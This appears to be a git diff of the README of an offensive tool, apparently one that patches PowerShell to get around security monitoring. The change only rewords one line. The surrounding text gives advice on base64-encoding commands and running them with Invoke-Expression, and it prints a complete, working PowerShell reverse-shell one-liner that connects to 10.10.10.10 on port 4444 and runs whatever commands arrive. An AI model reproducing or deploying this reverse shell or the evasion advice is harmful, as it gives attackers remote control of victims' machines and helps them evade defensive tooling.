@@ -17,7 +17,7 @@ g++ -m64 -o happy_hacking.exe -static main.cpp
 - It is important to verify that the commands contained in the base64 belong exclusively to PowerShell to ensure their correct execution. 
 - You should always try to use Invoke-Expression to make the command run in the patched powershell to avoid creating new powershell instances that are not patched.
 
-An example of a command that contains only PowerShell statements and can be base64 encoded:
+An example of a one-liner that contains only PowerShell statements and can be base64 encoded:
 
 ```powershell
 $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10', 4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535 | ForEach-Object {0}; while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {$data = ([System.Text.Encoding]::ASCII).GetString($bytes, 0, $i);$sendback = (Invoke-Expression $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ';$sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush()};$client.Close();
